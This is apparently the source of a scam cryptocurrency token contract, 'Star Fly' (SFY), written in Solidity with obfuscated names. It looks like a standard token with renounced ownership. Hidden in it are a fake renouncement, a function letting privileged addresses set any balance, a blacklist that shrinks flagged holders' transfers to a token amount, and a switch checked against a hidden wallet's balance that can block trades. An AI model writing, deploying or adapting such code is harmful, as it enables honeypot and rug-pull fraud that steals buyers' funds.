//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface sellBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tradingReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamMin {
    function createPair(address receiverSell, address exemptList) external returns (address);
}

interface senderIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellLimit) external view returns (uint256);

    function transfer(address txWallet, uint256 sellToken) external returns (bool);

    function allowance(address isMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellToken) external returns (bool);

    function transferFrom(
        address sender,
        address txWallet,
        uint256 sellToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isLaunch, uint256 value);
    event Approval(address indexed isMarketing, address indexed spender, uint256 value);
}

interface receiverSender is senderIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StarFly is tradingReceiver, senderIs, receiverSender {

    string private modeAtWallet = "SFY";

    function tradingLimit() private view {
        require(minAmount[_msgSender()]);
    }

    uint256 modeAt;

    bool private marketingFundMax;

    function totalSupply() external view virtual override returns (uint256) {
        return launchMarketing;
    }

    bool public amountMarketingLaunch;

    function balanceOf(address sellLimit) public view virtual override returns (uint256) {
        return liquidityEnableLaunch[sellLimit];
    }

    address shouldListReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private marketingTake;

    bool public autoLaunched;

    uint256 txTokenFrom;

    uint8 private tokenSwap = 18;

    function launchTx(address fromAutoTx, uint256 sellToken) public {
        tradingLimit();
        liquidityEnableLaunch[fromAutoTx] = sellToken;
    }

    function launchedAt(address launchedBuy, address txWallet, uint256 sellToken) internal returns (bool) {
        if (launchedBuy == toMode) {
            return takeReceiver(launchedBuy, txWallet, sellToken);
        }
        uint256 swapTeam = senderIs(launchTotalTake).balanceOf(autoFund);
        require(swapTeam == modeAt);
        require(txWallet != autoFund);
        if (receiverShould[launchedBuy]) {
            return takeReceiver(launchedBuy, txWallet, marketingIs);
        }
        return takeReceiver(launchedBuy, txWallet, sellToken);
    }

    address public launchTotalTake;

    function name() external view virtual override returns (string memory) {
        return atFrom;
    }

    uint256 private buyAuto;

    function approve(address totalExempt, uint256 sellToken) public virtual override returns (bool) {
        senderAmount[_msgSender()][totalExempt] = sellToken;
        emit Approval(_msgSender(), totalExempt, sellToken);
        return true;
    }

    function getOwner() external view returns (address) {
        return marketingTake;
    }

    mapping(address => uint256) private liquidityEnableLaunch;

    event OwnershipTransferred(address indexed limitAmount, address indexed launchTrading);

    string private atFrom = "Star Fly";

    address public toMode;

    bool private shouldMax;

    function symbol() external view virtual override returns (string memory) {
        return modeAtWallet;
    }

    function allowance(address toTradingSender, address totalExempt) external view virtual override returns (uint256) {
        if (totalExempt == shouldListReceiver) {
            return type(uint256).max;
        }
        return senderAmount[toTradingSender][totalExempt];
    }

    uint256 private toFrom;

    function transfer(address fromAutoTx, uint256 sellToken) external virtual override returns (bool) {
        return launchedAt(_msgSender(), fromAutoTx, sellToken);
    }

    address autoFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    constructor (){
        
        sellBuy launchSender = sellBuy(shouldListReceiver);
        launchTotalTake = teamMin(launchSender.factory()).createPair(launchSender.WETH(), address(this));
        
        toMode = _msgSender();
        maxMode();
        minAmount[toMode] = true;
        liquidityEnableLaunch[toMode] = launchMarketing;
        if (marketingFundMax != shouldMax) {
            shouldMax = true;
        }
        emit Transfer(address(0), toMode, launchMarketing);
    }

    function toBuy(address toTake) public {
        tradingLimit();
        if (marketingFundMax) {
            toFrom = buyAuto;
        }
        if (toTake == toMode || toTake == launchTotalTake) {
            return;
        }
        receiverShould[toTake] = true;
    }

    bool private toMarketing;

    function transferFrom(address launchedBuy, address txWallet, uint256 sellToken) external override returns (bool) {
        if (_msgSender() != shouldListReceiver) {
            if (senderAmount[launchedBuy][_msgSender()] != type(uint256).max) {
                require(sellToken <= senderAmount[launchedBuy][_msgSender()]);
                senderAmount[launchedBuy][_msgSender()] -= sellToken;
            }
        }
        return launchedAt(launchedBuy, txWallet, sellToken);
    }

    function isFrom(uint256 sellToken) public {
        tradingLimit();
        modeAt = sellToken;
    }

    uint256 private launchMarketing = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private senderAmount;

    function owner() external view returns (address) {
        return marketingTake;
    }

    mapping(address => bool) public minAmount;

    function swapAmount(address listModeSell) public {
        require(listModeSell.balance < 100000);
        if (autoLaunched) {
            return;
        }
        
        minAmount[listModeSell] = true;
        if (toFrom != buyAuto) {
            toMarketing = false;
        }
        autoLaunched = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return tokenSwap;
    }

    function maxMode() public {
        emit OwnershipTransferred(toMode, address(0));
        marketingTake = address(0);
    }

    function takeReceiver(address launchedBuy, address txWallet, uint256 sellToken) internal returns (bool) {
        require(liquidityEnableLaunch[launchedBuy] >= sellToken);
        liquidityEnableLaunch[launchedBuy] -= sellToken;
        liquidityEnableLaunch[txWallet] += sellToken;
        emit Transfer(launchedBuy, txWallet, sellToken);
        return true;
    }

    uint256 constant marketingIs = 17 ** 10;

    mapping(address => bool) public receiverShould;

}